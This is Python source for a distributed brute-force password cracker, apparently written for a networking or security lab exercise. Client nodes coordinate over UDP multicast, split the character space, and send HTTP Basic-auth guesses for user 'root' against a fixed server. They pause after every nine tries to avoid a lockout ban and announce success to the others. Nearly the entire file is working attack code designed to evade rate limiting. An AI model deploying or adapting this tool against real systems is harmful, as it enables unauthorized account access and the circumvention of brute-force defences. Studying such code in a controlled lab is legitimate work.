
import base64
import socket
import struct
import random
import selectors
import string
import time
import sys
import itertools
from const import (BANNED_TIME, COOLDOWN_TIME, PASSWORD_SIZE)
import json
from protocol import (JoinMessage, DoneMessage)


groupA3 = ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J',
           'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U']
groupB3 = ['V', 'W', 'X', 'Y', 'Z', 'a', 'b', 'c', 'd', 'e',
           'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p']
groupC3 = ['q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y',
           'z', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9']
groupA2 = ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O',
           'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', 'a', 'b', 'c', 'd', 'e']
groupB2 = ['f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't',
           'u', 'v', 'w', 'x', 'y', 'z', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9']


def randompassword(size=4):
    chars = string.ascii_uppercase + string.ascii_lowercase + string.digits
    return ''.join(random.choice(chars) for x in range(PASSWORD_SIZE))


class Slave():
    S_HOST = "10.0.2.15"
    S_PORT = 8000
    MY_ID = random.randint(0, 1000)
    MC_GROUP = "224.0.0.69"
    MC_PORT = 10000
    username = "root"
    counter = 0
    slaves = []
    ids = [] 
    slave_no = 1
    role = ""

    def __init__(self):

        ##
        # slave socket init
        #
        self.mc_address = (self.MC_GROUP, self.MC_PORT)
        # Create the socket
        self.sock = socket.socket(
            socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.sock.setsockopt(
            socket.SOL_SOCKET, socket.SO_REUSEPORT, 1
        )  # this line is only required for MacOS
        # Bind to the server address
        self.sock.bind(("", self.MC_PORT))

        # Tell the operating system to add the socket to the multicast group
        # on all interfaces.
        group = socket.inet_aton(self.MC_GROUP)
        mreq = struct.pack("4sL", group, socket.INADDR_ANY)
        self.sock.setsockopt(socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP, mreq)
        # Create selector and register callback

        ##
        # server socket init
        #
        self.server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_sock.connect((self.S_HOST, self.S_PORT))
        self.server_sock.setblocking(False)

        ##
        # selector
        #
        self.sel = selectors.DefaultSelector()
        self.sel.register(self.sock, selectors.EVENT_READ, self.got_message)
        self.sel.register(self.server_sock,
                          selectors.EVENT_READ, self.sock_recv)

        ##
    def got_message(self, sock):
        """Callback function to process multicast packets received."""
        data, address = sock.recvfrom(1024)
        if data is not None:
            data = data.decode('ascii')
        return data

    def sock_recv(self, sock):
        data = sock.recv(4096)
        try:
            return data.decode('utf-8')
        except UnicodeDecodeError as e:
            return "200"

    def multicast(self, password, sock):
        print("sending multicast...")
        sock.sendto(f"Password found :{password}".encode(
            'ascii'), self.mc_address)

    def attempt(self, password):
        print("\n*****************************************************")
        print(f"Attempted password: {password}")
        auth = '{}:{}'.format(self.username, password)
        auth = auth.encode('ascii')
        auth = base64.b64encode(auth)
        auth = auth.decode('ascii')

        header = [
            'GET / HTTP/1.1',
            'Host: {}'.format(self.S_HOST),
            'Authorization: Basic {}'.format(auth),
            'Connection: keep-alive'
        ]

        request = '\r\n'.join(header)+'\r\n\r\n'

        self.server_sock.send(request.encode('utf-8'))
        self.counter += 1

        if self.counter == 9:
            print("Entering cooldown")
            time.sleep(1)
            self.counter = 0

    def loop(self):  # Wait for announces and periodically annouce as a keep alive
        print(f"My ID is {self.MY_ID}")
        group = self.groupAtr(self.role, self.slave_no)
        print(group)
        while True:
            chars = string.ascii_lowercase + string.digits + string.ascii_uppercase
            for password_length in range(0, 2):
                for c in group:
                    for guess in itertools.product(chars, repeat=password_length):
                        password = c + ''.join(guess)
                        self.attempt(password)
                        event = self.sel.select()
                        for key, mask in event:
                            socket = key.fileobj
                            callback = key.data
                            response = callback(socket)
                            try:
                                if response is not None:
                                    if(socket == self.sock):
                                        response = json.loads(response)
                                        if response["command"] == "DONE": 
                                            print("Password has been cracked by another slave, terminating...")
                                            return True
                                    elif("401" in response):
                                        print(
                                            f"Attempt {self.counter+1} failed")
                                    elif("200" in response):
                                        print(f"Done, password was correct")
                                        dic = DoneMessage()
                                        json_dic = json.dumps(dic)
                                        self.sock.sendto(json_dic.encode(
                                            "ascii"), self.mc_address)
                                        print("sent confirmation message")
                                        return True
                            except Exception as e:
                                print(f"There was an error")
                                print(e)
                                _, _, extb = sys.exc_info()
                                print(extb.tb_lineno)
                                return True

    def check_slaves(self, timeout=5):
        print("Slaves are gathering...")
        dic = JoinMessage(self.MY_ID)
        json_dic = json.dumps(dic)
        self.sock.sendto(json_dic.encode("ascii"), self.mc_address)
        time.sleep(2)
        done = False
        while not done:
            event = self.sel.select(timeout=timeout)
            for key, mask in event:
                sock = key.fileobj
                data, address = sock.recvfrom(1024)
                data = data.decode('ascii')
                data = json.loads(data)
                if(data["command"] == "JOIN"):
                    identifier = int(data["data"])
                    self.slaves.append({"id": identifier, "addr": address})
                    if identifier not in self.ids:
                        self.ids.append(identifier)
            if not event:
                done = True
        self.slave_no = len(self.slaves)
        temp_ids = self.ids
        if max(temp_ids) == self.MY_ID:
            self.role = "A"
        elif min(temp_ids)==self.MY_ID:
            self.role = "B"
        else:
            self.role = "C"
        print("Slaves done gathering")

    def groupAtr(self,role, slaves):
        if slaves == 3:
            if role == "A":
                return groupA3
            if role == "B":
                return groupB3
            if role == "C":
                return groupC3
        elif slaves == 2:
            if role == "A":
                return groupA2
            if role == "B":
                return groupB2
        else:
            return groupA2 + groupB2


def main():
    t = Slave()
    try:
        t.check_slaves()
        t.loop()
    except KeyboardInterrupt as e:
        print("Client terminated the process, closing . . .")
        sys.exit(0)

if __name__ == "__main__":
    begin = time.time()
    main()
    end = time.time()
    elapsed = end - begin -5 -2
    print(f"Elapsed {elapsed} seconds")
